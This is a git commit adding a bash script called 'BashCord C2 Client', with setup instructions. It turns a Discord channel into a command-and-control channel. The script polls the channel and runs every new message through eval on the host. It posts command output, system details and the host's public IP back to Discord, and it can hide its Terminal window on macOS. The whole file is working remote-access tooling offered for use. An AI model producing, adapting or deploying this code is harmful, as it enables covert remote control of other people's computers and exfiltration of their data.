2e81c394adc4d3c8902770bcb1e58c3ebcdf149a
egieb <93350544+beigeworm@users.noreply.github.com>
2024-04-05 21:15:06 +0000

    Add files via upload

---
+++ Bashcord-C2-Client.sh
@@ -0,0 +1,194 @@
+#!/bin/bash
+
+# ================================= BashCord C2 Client ======================================
+
+# Using bash to send and receive commands from discord into a bash shell (on any system!)
+# Works on Linux, MacOS and Windows
+
+
+# **SETUP**
+# 1. make a discord bot at https://discord.com/developers/applications/
+# 2. add the bot to your discord server
+# 3. Give these permissions in Oauth2 tab and copy link into a browser url bar (Send-Messages, Read-messages/view-channels, Attach files)
+# 4. Click 'Reset Token' in "Bot" tab for your token
+# 5. Change YOUR_BOT_TOKEN_HERE below with your bot token
+# 6. Change CHANNEL_ID_HERE below to the channel ID of your channel.
+# 7. Change BOT_USER_ID_HERE below to your bots user ID.
+
+token="YOUR_BOT_TOKEN_HERE" # Your bot intents should be on and 'read messages' permissions when joining your server
+chan="CHANNEL_ID_HERE" # On Discord app rightclick the channel > 'Copy Channel ID' (Make sure the bot can access this channel)
+bot_id="BOT_USER_ID_HERE" # Settings > Advanced > Developer mode ON -- then On Discord app rightclick the bot > 'Copy User ID' 
+HideWindow=1 # (linux and mac only) -- 1 = hide console window
+
+generate_random_letters() {
+    local letters="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    local password=""
+    for i in {1..7}; do
+        random_index=$((RANDOM % ${#letters}))
+        password+=${letters:$random_index:1}
+    done
+    echo "$password"
+    sleep 1
+}
+
+HideConsole() {
+    if [ $HideWindow -gt 0 ]; then
+        osascript -e 'tell application "Terminal" to set visible of window 1 to false'
+    fi
+}
+
+Authenticate() {
+    if [[ "$command_result" == *"$password"* ]]; then
+        authenticated=1
+        json_payload="{\"content\": \":white_check_mark:   **Session Connected**   :white_check_mark:\"}"
+        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+    else
+        authenticated=0
+    fi
+}
+
+get_recent_message() {
+    recent_message=$(curl -s -H "Authorization: Bot $token" "https://discord.com/api/v9/channels/$chan/messages?limit=1")
+    user_id=$(echo "$recent_message" | grep -o '"author":{"id":"[^"]*' | grep -o '[^"]*$')
+    bot_check=$(echo "$recent_message" | grep -o '"bot":true')
+    if [ -n "$user_id" ] && [ -z "$bot_check" ]; then
+        recent_message=$(echo "$recent_message" | sed -n 's/.*"content":"\([^"]*\)".*/\1/p' | head -n 1)
+        echo "$recent_message"
+    else
+        echo ""
+    fi
+}
+
+sanitize_json() {
+    sanitized_result="${1//\"/\\\"}"
+    sanitized_result="${sanitized_result//\\/\\\\}"
+    sanitized_result="${sanitized_result//\\n/\\\\n}"
+    sanitized_result="${sanitized_result//\\ / }"
+    echo "$sanitized_result"
+}
+
+get_linux_info() {
+    os_info=$(uname -a)
+    kernel_version=$(uname -r)
+    uptime=$(uptime -p)
+    cpu_info=$(cat /proc/cpuinfo | grep "model name" | head -n 1 | cut -d ":" -f 2 | sed 's/^[ \t]*//')
+    mem_info=$(free -h | grep "Mem" | awk '{print "Total: " $2, " Used: " $3}')
+    disk_info=$(df -h --total | grep "total" | awk '{print "Total disk space: " $2, " Used: " $3}')
+    public_ip=$(curl -s https://api.ipify.org)
+    
+    linux_info="OS Info: $os_info\nKernel Version: $kernel_version\nUptime: $uptime\nCPU: $cpu_info\nMemory: $mem_info\nDisk: $disk_info\nPublic IP: $public_ip"
+    echo "$linux_info"
+}
+get_macos_info() {
+    os_info=$(uname -a)
+    kernel_version=$(uname -r)
+    uptime=$(uptime -p)
+    cpu_info=$(sysctl -n machdep.cpu.brand_string)
+    mem_info=$(system_profiler SPHardwareDataType | grep "Memory" | awk '{print "Total: " $2, " Used: " $4}')
+    disk_info=$(df -h / | grep "/dev/" | awk '{print "Total disk space: " $2, " Used: " $3}')
+    public_ip=$(curl -s https://api.ipify.org)
+    
+    macos_info="OS Info: $os_info\nKernel Version: $kernel_version\nUptime: $uptime\nCPU: $cpu_info\nMemory: $mem_info\nDisk: $disk_info\nPublic IP: $public_ip"
+    echo "$macos_info"
+}
+get_windows_info() {
+    os_info=$(systeminfo | grep "OS Name")
+    uptime=$(systeminfo | grep "System Boot Time")
+    cpu_info=$(wmic cpu get caption | grep -v "Caption")
+    mem_info=$(systeminfo | grep "Total Physical Memory")
+    disk_info=$(wmic logicaldisk get size,freespace,caption | grep "C:")
+    public_ip=$(curl -s https://api.ipify.org)
+    manufacturer=$(wmic computersystem get manufacturer | grep -v "Manufacturer")
+    model=$(wmic computersystem get model | grep -v "Model")
+    windows_version=$(uname -a)
+
+    windows_info="$os_info\n$uptime\nCPU: $cpu_info\n$mem_info\nDisk: $disk_info\nPublic IP: $public_ip\nManufacturer: $manufacturer\nModel: $model\nWindows Version: $windows_version"
+    echo "$windows_info"
+}
+
+execute_command() {
+
+    command_result=$(eval "$1" 2>&1)
+    if [ "$authenticated" -eq 1 ]; then
+
+        if [ "$1" == "close" ]; then
+            echo "Received 'close' command. Exiting Session..."
+            json_payload='{"content": ":octagonal_sign:   **Session Closed**   :octagonal_sign:"}'
+            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+            Sleep 1
+            exit 0
+        fi
+
+        if [ "$1" == "pause" ]; then
+            echo "Received 'pause' command. Pausing Session..."
+            authenticated=0
+            json_payload="{\"content\": \":pause_button:   **Session Paused**  |  Connect Code : \`$password \`  :pause_button:\"}"
+            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+            return
+        fi
+    
+        if [ "$1" == "sysinfo" ]; then
+            echo "Received 'sysinfo' command. Retrieving system information..."
+            case "$(uname -s)" in
+                Linux*)  sys_info=$(get_linux_info);;
+                Darwin*) sys_info=$(get_macos_info);;
+                CYGWIN*) sys_info=$(get_windows_info);;
+                MINGW*)  sys_info=$(get_windows_info);;
+                *)       sys_info="Unsupported OS" ;;
+            esac
+            json_payload="{\"content\": \"\`\`\`$sys_info\`\`\`\"}"
+            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+            return
+        fi
+        
+        if [ $? -eq 0 ]; then
+            if [ -n "$command_result" ]; then
+                temp_file=$(mktemp)
+                echo "$command_result" > "$temp_file"
+                accumulated_lines=""
+                while IFS= read -r line; do
+                    sanitized_line=$(sanitize_json "$line")
+                    if [ $((${#accumulated_lines} + ${#sanitized_line})) -gt 1900 ]; then
+                        json_payload="{\"content\": \"\`\`\`$accumulated_lines\`\`\`\"}"
+                        curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+                        accumulated_lines="$sanitized_line"
+                        Sleep 1
+                    else
+                        accumulated_lines="$accumulated_lines\n$sanitized_line"
+                    fi
+                done < "$temp_file"
+    
+                if [ -n "$accumulated_lines" ]; then
+                    json_payload="{\"content\": \"\`\`\`$accumulated_lines\`\`\`\"}"
+                    curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+                fi
+                rm "$temp_file"
+            else
+                json_payload='{"content": ":white_check_mark:   **Command Executed**   :white_check_mark:"}'
+                curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+            fi
+        else
+            error_message=$(echo "$command_result" | tr -d '\n' | sed 's/"/\\"/g')
+            json_payload="{\"content\": \"\`\`\`$command_result\`\`\`\"}"
+            curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+        fi
+    else
+        Authenticate
+    fi
+}
+
+random_letters=$(generate_random_letters)
+password="${password}${random_letters}"
+last_command_file=$(mktemp)
+HideConsole
+json_payload="{\"content\": \":hourglass:   **Session Waiting**  |  Connect Code :  \`$password \`  :hourglass:\"}"
+curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
+
+while true; do
+    recent_message=$(get_recent_message)
+    if [[ ! -z $recent_message && $recent_message != $(cat $last_command_file 2>/dev/null) ]]; then
+        execute_command "$recent_message"
+        echo "$recent_message" > $last_command_file
+    fi
+    sleep 5
+done
